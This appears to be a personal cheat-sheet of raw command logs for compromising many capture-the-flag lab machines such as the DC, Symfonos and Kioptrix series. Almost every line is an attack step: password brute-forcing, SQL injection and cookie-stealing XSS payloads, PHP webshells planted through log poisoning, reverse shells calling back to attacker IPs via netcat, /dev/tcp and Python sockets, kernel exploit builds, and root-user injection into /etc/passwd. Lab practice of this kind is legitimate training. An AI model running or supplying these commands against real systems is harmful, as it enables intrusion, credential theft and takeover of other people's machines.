BOX STEP




Basic Pentesting 2
==================================
dirb http://10.0.2.14
enum4linux 10.0.2.14
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.0.2.14 ssh
ssh jan@10.0.2.14
https://www.exploit-db.com/download/44298.c
cat /home/kay/.ssh/id_rsa
ssh2john key > sshtojohn
john sshtojohn
ssh -i -d_rsa@localhost
cat pass.bak
sudo -i
##another way
find / -perm -u=s -type f 2>/dev/null
cd home/kay/
vim.basic pass.bak




Web For Pentester I & II
==================================
##SQL Inject
root' or '1'='1
root'%09or%09'1'='1
root'/**/or/**/'1'='1
2'/**/or/**/'1'='1
2 or 1=1
' or 1=1#
‘ or 1=1 LIMIT 1#
example5/?limit=3 union all select * from users
username =’\ ‘ and password =’ or 1=1#
/example5/?group=username union all select * from users
example7/?id=1 --dump-all)
呵' or 1=1 #
##XXS
<script>document.write('<img src="http://10.0.2.15/?'+document.cookie+'  "/>');</script>
#socat TCP-LISTEN:80,reuseaddr,fork -
>document.cookie = "PHPSESSID=07st4kqcbdr2ddrd4naalt9504"
<script>alert(1);</script>
<script>alert(1);</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src="xxxx" onerror="alert(1)">
<script>prompt(1)</script>
";alert(1);//
';alert(1);//
/" onmouseover="alert(1)
#<script>alert(1)</script>



Pumpkin Garden
==================================
nmap -p- -A 10.0.2.15
ftp 10.0.2.15
get note.txt
cat note.txt
dirb http://10.0.2.15:1515
10.0.2.15;1515/img/hidden_secret/clue.txt
echo c2NhcmVjcm93IDogNVFuQCR5 | base64 -d
ssh scarecrow@10.0.2.15 -p 3535
su goblin
##exploit https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
cat > sudoedit << _EOF
#!/bin/sh
echo ALEX-ALEX
su
/bin/su
/usr/bin/su
_EOF
chmod a+x ./sudoedit
sudo ./sudoedit $1



Necromancer 1
==================================
nmap -sU -p1-65535 10.0.2.16
nc -lvp 4444
echo "$from port 4444" | base64 -d
nc -u 10.0.2.16
opensesame ##md5 hash reverse flag3
nikto -h 10.0.2.16
wget http://10.0.2.16/pileoffeathers.jpg
strings pileoffeathers.jpg
zip pileoffeathers.jpg && unzip pileoffeathers
cat feathers.txt
10.0.2.5/amagicbridgeappearsatthechasm
cewl https://en.wikipedia.org/wiki/List_of_occult_terms -m4 -d0 -w listofwords.txt
wget http://10.0.2.16/amagicbridgeappearsatthechasm/talisman
chmod 700 talishman && ./talishman
wearTalisman
chantToBreakSpell
echo “blackmagic” | nc -u 10.0.2.16 31337
http://10.0.2.16/thenecromancerwillabsorbyoursoul/
aircrack-ng /root/Downloads/necromancer.cap -w /usr/share/wordlists/rockyou.txt
use auxiliary/scanner/snmp/snmp_enum
set rhost 10.0.2.16
set community death2all
run
snmpwalk -v 2c -c death2all 10.0.2.16
Unlocked
hydra -l demonslayer -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.16:22
ssh demonslayer@10.0.2.16
nc -u localhost 777
KELEWAN
Mephistopheles
Hedge
sudo cat /root/flag11.txt



Replay 1 CTF
==================================
10.0.2.17/robots.txt
wget 10.0.2.17/bob_bd.zip
unzip bob_bd.zip
string client.bin
##found 2nd passwd, 1st passwd inside html homepage
./client.bin ##apps to connect database, use it to make machine connect me
vi client.bin
nc -e /bin/bash 192.168.1.25 4444;ls;ls;ls;ls;ls;ls;ls; ##binnary file read binary reverse
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
cd Documents/.ftp
cat user.passwd
sudo -i



Raven 1
==================================
nikto --host http://10.0.2.18
wpscan --url http://10.0.2.18/wordpress --wp-content-dir -ep -et -eu
wpscan --url http://10.0.2.18/wordpress -U steven -w /usr/share/wordlists/rockyou.txt

##login ssh user michael no passwd
ssh michael@10.0.2.18
cat /var/www/html/wordpress/wp-config.php
john wp_hashes.txt
john show wp-hashes.txt
su steven
sudo -l
sudo python -c 'import pty;pty.spawn("/bin/bash")';
sudo python -c 'import os;os.system("/bin/bash")'
 



DerpNStink
==================================
dirb http://10.0.2.19 /usr/share/wordlist/dirb/big.txt
wpscan --url http://10.0.2.19/weblog
		##login admin admin & upload php reverse shell to galery /usr/share/webshells/php/php-reverse-shell.php
nc -lvp 3434
cat /var/www/html/weblog/wp-config.php
		##wp-config.php get credentials databases
		##login ftp, get rsa key, login ssh
ssh key stinky@10.0.2.19
		##download pcap exe with wireshark and get the password
su mrderp
sudo -l
mkdir -p /home/mrderp/binaries/
echo "/bin/bash" > derpy.sh && chmod +x derpy.sh


Casino Royale
==================================
dirb http://10.0.2.20
searchsploit poker
searchsploit -m 6676
sqlmap -u http://10.0.2.20/pokeradmin/index.php --forms --risk 3 --level 5 --dbs --batch
sqlmap -u http://10.0.2.20/pokeradmin/index.php --forms --risk 3 --level 5 -D pokerleague --dump-all --batch
searchsploit snowfox
telnet 10.0.2.20 25
mail from: asd
rcpt to: valenka
data
subject: obanno
http://10.0.2.16/form.html
.
quit
		##php web shell by login ftp
ftp://10.0.2.20
nc -lvp 3434
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
		##root apps running under user apps & edit user apps with python reverse run by root
export RHOST="10.0.2.16";export RPORT=2323;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvp 2323



DC-1
==================================
nmap -sV -sC 10.0.2.21
whatweb http://10.0.2.21
searchsploit Drupal 7
python /usr/share/exploitdb/exploits/php/webapps/34992.py -u asdasdasd -p asdasdasd -t http://10.0.2.21
##login, insert plugin from https://www.drupal.org/project/shell
nc -nv 10.0.2.16 3434 -e /bin/bash
nc -lvp 3434
msfconsole
use exploit/multi/http/drupal_drupageddon
set lhost 10.0.2.21
run exploit
find / -perm -4000 -type f 2>/dev/null | xaxrgs ls -laht
find . -exec '/bin/sh' \;
find / -name flag*
cat /var/www/sites/default/settings.php



DC-2
==================================
nmap -sC -sV -A -p- 10.1.1.43
wpscan --url http://dc-2/ -e u,vt,vp
http://dc-2/index.php/flag
./cewl.rb http://dc-2/ -w cewlpasswd.txt
wpscan --url http:dc-2 -U user.txt -P cewlpasswd.txt
		##got credz jerry:adipiscing tom:parturient
ssh tom@10.1.1.43 -p 7744
help
vi
:set shell=/bin/bash
:shell
echo $PATH
export PATH=$PATH:/bin:/usr/bin
su jerry
sudo -l
sudo git -p help config
!/bin/sh





DC-3
==================================
nmap -sC -sV -A -p- 10.1.1.44 -o nmap
dirb http://10.1.1.44
http://10.1.1.44/administrator
http://10.1.1.44/language/en-GB/en-GB.xml
joomscan 10.1.1.44
searchsploit joomla 3.7.0
searchsploit -m 42033.txt
sqlmap -u "http://10.1.1.44/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
sqlmap -u "http://10.1.1.44/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables
sqlmap -u "http://10.1.1.44/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -T '#__users' -C name,password --dump
		##got credz admin:$27$10y$bouue197ghou4tf971gh3ougt913
john joomlacredz.txt --wordlist=/home/rockyou.txt
		##got crack admin:snoopy
		##login as admin and edit template to get reverse shell
nv -lvp 4343
python -c 'import pty.pty.spawn("/bin/bash")'
^z
stty raw -echo
fg
reset
which wget
python -m SimpleHTTPServer 8888
wget http://10.1.1.5:8888/linenum.sh .
chmod +x linenum.sh
./linenum.sh
serachsploit ubuntu 16.04 4.4
searchsploit -m 39772.txt
wget https://github.com/offensive-sercurity/exploitdb-bin-sploits/raw/master/binsploits/39772.zip
unzip 39772.txt
cd 39772
tar -xvf exploit.tar
./compile.sh
./doubleput





DC-4
====================================
nmap -sC -sV -A -p- 10.1.1.45 -o nmap
dirb http://10.1.1.45 -X .php
curl -v http://10.1.1.45/command.php
hydra -l admin -P /home/rockyou.txt 10.1.1.45 http-post-form "/login.php:username=^USER^&password=^PASS^:S=302" -V
		##failed lolz
		##bruteforce with bupsuite wordlist /usr/share/wordlist/dirb/others/
		##got credz admin:password
http://10.1.1.45/command.php
		##get reverse shell
cat /home/jim/backup/passwd.bak
nc -w 3 10.1.1.5 4321 < passwd.bak
nc -lvp 4321 . passwd.txt
hydra -l jim -P passwd.txt 10.1.1.45 -t 4 -V ssh
		##got credz jim:jibril04
cat /var/mail/jim
		##got credz charles"^mZstqhsq9
ssh charles@10.1.1.45
sudo -l
LFILE=/etc/passwd
echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" | sudo teehee -a "$LFILE"
su rooot





DC-5
=======================================
nmap -sC -sV -A -p- 10.1.1.46 -o nmap
dirb http://10.1.1.46 -X .php
http://10.1.1.46/thankyou.php?file=/etc/passwd
http://10.1.1.46/thankyou.php?file=/var/log/nginx/error.log
http://10.1.1.46/thankyou.php?file=<?php system($_GET["c"]) ?>
http://10.1.1.46/thankyou.php?file=/var/log/nginx/error.log&c=id
http://10.1.1.46/thankyou.php?file=/var/log/nginx/error.log&c=nc -e /bin/bash 10.1.1.5 4343
nc -lvp 4343
find / -uid 0 -perm -4000 -type f 2>/dev/null | xargs ls -laht
searchsploit screen-4.5.0
searchsploit -m 41152.txt
screen --version
searchsploit -m 41154.sh
			##just like Wintermute
			##exploit screen 4.5


DC-6
======================================
nmap -sC -sV -A -p- 10.1.1.47 -o nmap
dirb http://10.1.1.47 -X .php
wpscan --url=http://wordy/ -e u,vt,vp
cat /home/rockyou.txt | grep k01 > passwd.txt
wpscan --url=http://wordy/ -U user.txt -P passwd.txt
		##got credz mark:helpdesk01
searchsploit wordpress activity
serachsploit -m 45274
nano 45274.html
		##edit target and ip
python -m SimpleHTTPServer 8888
127.0.0.1:8888/45274.html
nv -lvp 4343
python -c 'import pty;pty.spawn("/bin/bash")'
cat /home/mark/stuff/things-to-do.txt
		##got credz graham:GSo7isUM1D4
ssh graham@wordy
sudo -l
nano /home/jens/backup.sh
		##add /bin/bash
sudo -u jens backup.sh
sudo -l
echo "os.execute('/bin/sh')">/tmp/root.nse
sudo nmap --script=/tmp/root.nse




DC-7
====================================
nmap -sC -sV -A -p- 10.1.1.48 -o nmap
dirb http://10.1.1.48 -X .php
git clone https://github.com/immunIT/drupwn
python3 setup.py install
drupwn enum http://10.1.1.48/
https://github.com/Dc7User
		##got credz dc7user:MdR3xiast8
ssh dc7user@10.1.1.48
cat mbox
cat /opt/script/backups.sh
drush --help
cd /var/www/html
drush user-password admin --password=godmode
http://10.1.1.48/user/login
		##install new module from here: https://www.drupal.org/project/php
		##activate/enable and create new content with php reverse shell
nc -lvp 4343
cd /opt/script
msfvenom -p cmd/unix/reverse_netcat lhost=10.1.1.5 lport=4141 R
echo "mkfifo /tmp/asd; nc 10.1.1.5 4141 0</tmp/asd | /bin/sh >/tmp/asd 2>&1; rm /tmp/asd" >> backups.sh
nc -lvnp 4141
		##you can use either mkfifo or mknode reverse shell because nc version is not enable -e options





DC-8
===================================
nmap -sC -sV -A -p- 10.1.1.49 -o nmap
dirb http://10.1.1.49
droopescan scan drupal -u http://10.1.1.49
http://10.1.1.49/?nid=/etc/passwd
http://10.1.1.49/?nid=2'
sqlmap -u 10.1.1.48/\?nid\= --level 4 --dbs
sqlmap -u 10.1.1.48/\?nid\= --level 4 -D d7db --tables
sqlmap -u 10.1.1.48/\?nid\= --level 4 -D d7db -T users -C name,init,pass --dump
		##got credz john and admin
john credz.txt --wordlist=/home/rockyou.txt
		##got credz john:turtle
http://10.1.1.49/user/login
		##edit contact page, edit the form-setting and add reverse shell and put random string on the top or above
nc -lvp 4444
find / -uid 0 -perm -4000 -type f 2>/dev/null		
dpkg -l | grep exim
exim --version
searchsploit exim 4.89
searchsploit -m 46996
		##everytime I tried, I got error '\r':command not found
sed -i 's/\r$//' 46996.sh
nc 10.1.1.49 1234 < 46996.sh
nc -lvp 4321 > x.sh
bash x.sh -m netcat
nc -e /bin/bash 10.1.1.5 5555
nc -lvp 5555




DC-9
====================================
nmap -sC -sV -A -p- 10.1.1.52 -o nmap
dirb http://10.1.1.52 -X .php,.html,.txt,.log
http://10.1.1.52/welcome.php
		##capture search POST req into txt file
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D Staff --dump-all --batch
		##got credz admin:856f5de590ef37314e7c3bdf6f8a66dc
sqlmap -r req.txt -D users --dump-all --batch
sqlmap -r req.txt -D users -C username,password --batch
		##got another credz
http://10.1.1.52/welcome.php?file=../../../../etc/passwd
http://10.1.1.52/welcome.php?file=../../../../etc/knockd.conf
knock 10.1.1.52 9842 8475 7469
nmap -p22 10.1.1.52
hydra -L user.txt -P passwd.txt -T 4 10.1.1.52 ssh
		##got credz chandlerb:UrAG0D!
		##joeyt:Passw0rd
		##janitor:Ilovepeepee
ssh janitor@10.1.1.52
ls -lah
cat .secret-for-putin/password-foud-post-it-notes.txt
hydra -L user.txt -P passwd.txt -T 4 10.1.1.52 ssh
		##got new credz fredf:B4-Tru3-001
ssh fredf@10.1.1.52
sudo -l
cd /opt/devstuff/
cat test.py
openssl passwd -1 -salt ignite godmode
echo "rooot:w0cHJ.a5mvNYKk:0:0:root:/root:/bin/bash" >> /tmp/exp
sudo dist/test/test /etc/exp /etc/passwd
su rooot
id
cat ~/theflag.txt






Prime-1
====================================
dirb http://10.0.2.20
dirb http://10.0.2.20 -X .txt,.php,.html
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 500 --hl 6 http://10.0.2.20/image.php?secrettier360=FUZZ
msfveom -p php/meterpreter/reverse_tcp lhost=10.0.2.16 lport=3434 R
use exploit/multi/handler
show payloads
set payload php/meterpreter/reverse_tcp
set lhost 10.0.2.20
set lport 3434
exploit
/1
use exploit/linux/local/bpf_sign_extention_priv_esc
set session 1
exploit
/2
cd /tmp
nano exp.c ##grep this content https://packetstormsecurity.com/files/148517/Linux-Kernel-Local-Privilege-Escalation.html
gcc exp.c exp
./exp



HA Wordy
====================================
dirb http://10.0.2.19
wpscan --url http://10.0.2.19/wordpress --enumerate u
		##Reflex galery || Arbitary File Upload
use exploit/unix/webapp/wp_refrexgallery_file_upload
set rhost 10.0.2.19
set targeturi /wordpress/
exploit
find / -perm -u=s -type f 2>/dev/null ##cp & wget
cp /etc/passwd /var/www/html/ ##edit on local
openssl passwd -1 -salt ignite pass123
wget http://10.0.2.16/passwd
		##Mail Masta & WP Support || LFI
http://10.0.2.19/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
curl http://10.0.2.19/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd
echo "YWFydGk6YWFydGlAZ21haWwuY29t" | base64 -d	
searchsploit wp-support
searchsploit -m 41006
cat 41006.txt
		##create html file
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
Username: <input type="text" name="username" value="aarti">
<input type="hidden" name="email" value="aarti@gmail.com">
<input type="hidden" name="action" value="loginGuestFacebook">
<input type="submit" value="Login">
</form>
		##Gwolle || RFI
http://10.0.2.19/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.0.2.16/shell.php
nc -lvp 3434



Symfonos: 1
====================================
enum4linux 10.0.2.22
smb://10.0.2.22/anonymous
smb://10.0.2.22/helios
smbclient //10.0.2.22/helios
wpscan --url http://symfonos.local/h3l105/ --enumerate u
		##Site Editor Exploit
http://10.0.2.22/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
		##SMTP Poisoning
telnet 10.0.2.20 25
helo example.com
mail from: asd@asd.asd
rcpt to: asd@symfonos.localdomain
data
<?php echo shell_exec($_GET['cmd']); ?>
http://10.0.2.22/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/asd&cmd=id
http://10.0.2.22/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/asd&cmd=nc%20-e%20%2Fbin%2Fbash%2010.0.2.16%203434
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
find / -uid 0 -perm -4000 -type f 2>/dev/null | xargs ls -laht
strings /opt/statuscheck
		##build program set user id in C setuid.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void)
{setuid(0); setgid(0); system("/bin/bash");}
gcc -o setuid setuid.c
echo "chown root:root /tmp/setuid && chmod u+s /tmp/setuid" >> ./curl
chmod 777 curl && chmod 777 setuid
explort $PATH=/tmp:$PATH
/opt/statuscheck



Symfonos: 2
==================================
nmap -sC -sV 10.0.2.23
smbmap -H 10.0.2.23
smbclient -N \\\\10.0.2.23\\anonymous
cd backups
get log.txt
hydra -l aeolus -P /home/rockyou.txt ftp://10.0.2.23
ssh aeolus@10.0.2.23
cd /tmp
wget http://10.0.2.16/linuxenum.sh
./linuxenum.sh
/etc/apache2/sites-enabled
searchsploit librenms
ssh -L 8888:localhost:8080 aeolus@10.0.2.23
msfconsole
use exploit/linux/http/librenms_addhost_cmd_inject
set rhosts localhost
set rport 8888
set username aeolus
set password sergioteamo
set lhost eth0
exploit
python -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
sudo /usr/bin/mysql -e '\! /bin/sh'



Symfonos 3
===================================
dirb http://10.0.2.24
dirbuster http://10.0.2.24/gate/
10.0.2.24/cgi-bin/underworld/
		##with metasploit 
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_enc_exec
set rhost 10.0.2.24
set lhost 10.0.2.16
set targeturi /cgi-bin/underworld/
exploit
		##shellshock with manual curl (manual 'iptime' command linux)
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.0.2.24/cgi-bin/underworld
curl -H "user-agent: () { :; }; echo; echo; /bin/nc -e /bin/bash 10.0.2.16 3434" http://10.0.2.24/cgi-bin/underworld
curl -A "() { :; }; /bin/bash -c 'nc 10.0.2.16 3434 -e /bin/sh'" http://10.0.2.24/cgi-bin/underworld
nc -lvp 3434
python -c "import pty;pty.spawn('/bin/bash')"
		##tools pspy monitor all process (include cron) real-time
wget http://192.168.127.129/pspy32
chmod 755 pspy32
./pspy32
tcpdump -v -i lo port 21
vi ftpclient.py
		##edit cron job file ftpclient.py
import socket,subprocess,os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.16",9090))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
		##or add this script under the line
import sys
import os
os.system(nc 10.0.2.16 9090 -e /bin/bash)
nc -lvp 9090



Symfonos 4
===================================
dirb http://10.0.2.27/ /usr/share/wordlists/dirb/big.txt -X .php
		## login sqli with 'or'1'='1'#
http://10.0.2.27/sea.php?file=../../../../../../../var/log/auth
ssh '<?php system($_GET['c']); ?>'@10.0.2.27
ssh 10.0.2.27 -l '<?php die(exec($_GET["c"]));?>'
http://10.0.2.27/sea.php?file=../../../../../../../var/log/auth&c=nc 10.0.2.16 3434 -e /bin/bash
nc -lvp 3434
ss -tulpn
ps
socat tcp-listen:7000,reuseaddr,fork tcp:localhost:8080
http://10.0.2.27:7000
		##intercept cookie
		##change with this reverse python script with base64 ecnryption
{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 10.0.2.16 4444"], null, null, null]}
root:pass123


Solid State
===================================
nmap -sC -sV -p- 10.0.2.28
telnet 10.0.2.28 4555
help
listuser
setpassword james asd
setpassword john asd
setpassword mindy asd
telnet 10.0.2.28 110
user john
pass asd
list
retr 1
quit
telnet 10.0.2.28 110
user mindy
pass asd
list
retr 1
retr 2
quit
ssh mindy@10.0.2.28
exploitdb35513.py ##https://www.exploit-db.com/exploits/35513/
payload = 'nc -e /bin/sh 10.0.2.16 8000'
./exploitdb35513
nc -lvp 8000
ssh mindy@10.0.2.28
python -c 'import pty;pty.spawn("/bin/bash")'
ps -aux | grep james
cd /opt
ls || cat tmp.py
nano tmp.py
#!/usr/bin/env python
import os
import sys
os.system('/bib/nc -e /bin/bash 10.0.2.16 3434')
cd /tmp
wget http://10.0.2.16/tmp.py
nc -lvp 3434
cp tmp.py /opt




Node 1
===============================
nmap -sC -sV -p- 10.0.2.29
view-source:http://10.0.2.29:3000/login
view-source:http://10.0.2.29:3000/assets/js/app/controller/home.js
10.0.2.29:3000/api/users/latest
10.0.2.29:3000/api/users
		##hash crack with crackstation.net
cat myplace.backup | base64 -d > myplace
file myplace.backup
unzip myplace
fcrackzip –dictionary –use-unzip –init-password /usr/home/rockyou.txt myplace
cat app.js
ssh mark@10.0.2.29
uname -a
cat /etc/issue
wget https://www.exploit-db.com/download/44298 /tmp/44298.c
gcc 44298.c -o 44298
./44298
		##use mongodb exploit
cd /home/node/
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.16 LPORT=1234 -f elf -o rev
cp rev /var/www/html
wget http://10.0.2.16/rev
mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler
>db.tasks.insert({"_id" : 0, "cmd" : "/tmp/rev"})
>quit()
nc -lvp 1234
gzip -c < /usr/local/bin/backup > /tmp/backup.gz
base64 < /tmp/backup.gz




Kioptrix 1
===================================
nmap -sC -sV -V -p- 10.0.2.30
enum4linux 10.0.2.30
cp /usr/share/exploitdb/exploits/unix/remote/764.c
gcc -o fuck 764.c -lcrypto
./fuck 0x6b 10.0.2.30 -c 45
cp /usr/share/exploitdb/exploits/multiple/remote/10.c .
gcc -o exploitsamba 10.c
./exploitsamba -b 0 -c 10.0.2.16 10.0.2.30



OZ 1
===================================
##mysql seems not running
git clone https://github.com/epinna/tplmap
./tplmap.py -u 'http://192.168.204.132:8080' -X POST -d 'name=*&desc=anything' -c 'token=TOKEN' --reverse-shell 192.168.204.129 3434
nc -lvp 3434



MR Robot
===================================
nmap -sC -sV -A -p- 10.0.2.31 -oA nmapfull
dirb http://10.0.2.31
wpscan --url http://10.0.2.31 --enumerate u
http://10.0.2.31/robots.txt
cat fsocity.dic | sort -r | uniq > fsocity.dic.sort
wc -l fsocity.dic.sort
wpscan --url http://10.0.2.31 -U elliot -P /home/mrrobot/fsocity.dic.sort
cp /usr/share/webshell/php/php-reverse-shell.php
		##edit and upload shell into archive wordpress
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
reset
 		##full stty source:https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
10.0.2.31/wp-content/themes/twentyfifteen/archive.php
		##crack password.raw-md5 from /home/robot in md5crack online
echo ljBOUvoyFpIgpUgfJFOyFoVouF > robothash
hashcat -a 0 -m 0 robothash /home/rockyou.txt 
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
/usr/local/bin/nmap --interactive
!sh



Pwn Lab INIT
===================================
dirb http://10.0.2.32
10.0.2.32/?page=php://filter/convert.base64-encode/resource=config
		##encode base64 passwd mysql
mysql -h 10.0.2.32 -u root -p
		##dump database Users
login
10.0.2.32/?page=upload
		##get source from response in burp
		##read rfi to exe source: https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/
10.0.2.32/?page=php://filter/convert.base64-encode/resource=index
document.cookie = "lang=../../../../../etc/passwd"
document.cookie = "lang=../upload/mif813yr9hosaf8h0iqj0.gif"
nc -lvp 3434"
10.0.2.32
su kane
cd && ls -lah
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
strings msgmike
echo /bin/bash > /tmp/cat
chmod 777 /tmp/cat
echo $PATH
export PATH=/tmp:$PATH
./msgmike
cd && ls -lah
find / -perm -4000 -type f 2>/dev/null | xargs | ls -laht
./msg2root
asdasd && /bin/sh
asdasd; bash -p
document.cookie= 'lang=../../../../../etc/passwd; expires=Thu; 01 Jan 1970 00:00:00 GMT; path=/; domain=10.0.2.32"
document.cookie= 'lang=../upload/mif813yr9hosaf8h0iqj0.gif; expires=Thu; 01 Jan 1970 00:00:00 GMT; path=/; domain=10.0.2.32"



Wintermute 1
==========================================
kali(10.0.2.16) - (.33) straylight (192.168.56.102) - (.103) Neuromancer
http://10.0.2.33:3000
http://10.0.2.33:3000/lua/flow_stats.lua
http://10.0.2.33/turing-bolo/bolo.php?bolo=../../../../../log/mail
telnet 10.0.2.33 25
helo asd.asd
mail from: asd@asd.asd
		##or mail from: <?php echo shell_exec($_GET['cmd']);?>
		##or rcpt to: <?php system($_POST['cmd']);?>
rcpt to: <?php system($_REQUEST['cmd']);?>
data
.
quit
http://10.0.2.33/turing-bolo/bolo.php?bolo=../../../../../log/mail&cmd=id
nc -lvp 3434
http://10.0.2.33/turing-bolo/bolo.php?bolo=../../../../../log/mail&cmd=nc%20-e%20%2Fbin%2Fbash%2010.0.2.16%203434
python -c 'import pty;pty.spawn("/bin/bash")'
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
searchsploit screen 4.5
cp /usr/share/exploitdb/exploits/linux/local/41154.sh .
		##cant complie, create manual making file libhax.c and rootshell.c
wget http://10.0.2.16/libhax.c
wget http://10.0.2.16/rootshell.c
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c
cd /etc
unmask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
./tmp/rootshell
wget http://10.0.2.16/ping.sh
cat ping.sh
#!/bin/bash
ip in $(seq 1 254); do
	ping -c 1 192.168.56.$ip | grep "bytes from" | cut -d " " -f4 |cut -d ":" -f1 &
done
nc -vnzw1 192.168.56.103 1-65535
which socat
socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.56.103:8009 &
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.56.103:8080 &
socat TCP-LISTEN:34483,fork,reuseaddr TCP:192.168.56.103:34483 &
socat TCP-LISTEN:4444,fork,reuseaddr TCP:10.0.2.16:4444 &
10.0.2.33:8080/struts2_2.3.15.1-showcase
searchsploit struts showcase
		##exploit struts as exploit.sh from https://www.exploit-db.com/exploits/42324/
nc -lvp 4444
./exploit.sh "nc 192.168.56.102 4444"
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f elf -o rev
cp rev /var/www/html
python -m SimpleHTTPServer 4444
./exploit.sh "wget http://192.168.56.102/rev -O /tmp/rev"
./exploit.sh "chmod 755 /tmp/rev"
./exploit.sh "sh -c /tmp/rev"
nc -lvp 4444
ssh keygen -t ta
cat id_ta.pub
		##copy id_ta from kali to authorized keys target
cd /home/ta
chmod 755 .ssh
touch .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
echo "cat id_ta.pub" > .ssh/authorized_keys
ssh -i id_ta -p 34483 ta@10.0.2.33
uname -a
searchsploit ubuntu 16.04
wget http://192.168.56.102/exploit ##source exploit https://www.exploit-db.com/exploits/44298/
chmod +x exploit
./exploit



Kioptrix 2
=================================================
http://10.0.2.15
##SQLi user:'or'a'='a'#
sqlmap -u "http://10.0.2.15/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
cat php-reverse-shell.php | nc -l 8080
; wget 10.0.2.16:8080 -O /tmp/shell.php
; php /tmp/shell.php
; bash -i >& /dev/tcp/10.0.2.16/3434 0>&1
nc -lvp 3434
;/usr/local/bin/nc 10.0.2.16 4444 -e ‘/bin/bash'
nc -lvp 4444
searchsploit centos 4.5
cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c /var/www/html/
python -m SimpleHTTPServer 8888
wget http://10.0.2.16/9542.c -O /tmp/ex.c
gcc ex.c
./ex.out
cat /var/www/html/index.php ##to find mysql cred




Jarvis
================================================
http://10.10.10.143/room.php?cod=3'
sqlmap -u http://10.10.10.143/room.php?cod=3 --dump
sqlmap -u http://10.10.10.143/room.php?cod=3 --level 5 --risk 3 --dump
sqlmap -u http://10.10.10.143/room.php?cod=3 --level 5 --risk 3 --os-shell
python -m SimpleHTTPServer 8888
wget http://10.10.14.86:8888/p0wny.php ##source https://github.com/flozz/p0wny-shell/blob/master/shell.php
http://10.10.10.143/shell.php
socat file:`tty`,raw,echo=0 tcp-listen:3434 ##listener
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.86:3434 ##target
netstat -plnt
sudo -l
python /var/www/AdminUtilities/simpler.py
python simpler.py -p
cat simpler.py
cat shell.sh
#!/bin/bash
0<&196;exec 196<>/dev/tcp/10.10.14.86/4343; sh <&196 >&196 2>&196
		##input $(/bin/bash /tmp/shell.sh)
nc -lvp 4343
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
		##exploit systemctl source:https://gtfobins.github.io/gtfobins/systemctl/
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cat /tmp/output
echo '#/bin/bash
nc 10.10.14.86 9999 -e /bin/bash' > hacked
nc -lvp 4444  ##listening
echo '[Unit]
Descriptor= hacked Service
ExecStart=/bin/sh -c /tmp/hacked
[Install]
WantedBy=multi-user.target' > hacked.service
/bin/systemctl enable --now hacked.service
stop hacked.service
start hacked.service
/bin/bash -i  ##got root shell



Haystack
======================================
wget http://10.10.10.115/needle.jpg
strings needle.jpg
echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d
http://10.10.10.115:9200/_cat/indices
